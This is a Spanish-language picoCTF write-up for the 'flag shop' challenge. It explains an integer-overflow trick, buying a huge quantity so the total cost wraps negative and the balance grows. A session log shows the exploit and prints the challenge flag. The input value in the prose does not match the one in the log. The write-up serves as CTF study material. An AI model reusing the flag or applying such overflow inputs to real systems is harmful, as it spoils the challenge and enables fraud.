#### Description

[](https://github.com/Tiitania/hacking-nodes-2025/blob/main/PicoCTF/Examen%20P.2/flag_shop.md#description)

There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/dd28f0987f28c894f35d5d48564c3402/store.c). Connect with nc jupiter.challenges.picoctf.org 4906

#### Hints 

[](https://github.com/Tiitania/hacking-nodes-2025/blob/main/PicoCTF/Examen%20P.2/flag_shop.md#hints)

- Two's compliment can do some weird things when numbers get really big!

## Solución

[](https://github.com/Tiitania/hacking-nodes-2025/blob/main/PicoCTF/Examen%20P.2/flag_shop.md#soluci%C3%B3n)

- Cuando vatamos a insertar el valor que queremos comprar, metemos un valor grande para que el programa no pueda leerlo y obtener un numero negarivo que nos daría más dinero para poder comprar nuestra bandera, en este caso el valor a instertar es: 10000000000000000

```

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
100000000000000000

The final cost is: -651689984

Your current balance after transaction: 651691084

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one
1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
Welcome to the flag exchange
We sell flags

3. Check Account Balance

4. Buy Flags

5. Exit

 Enter a menu selection
```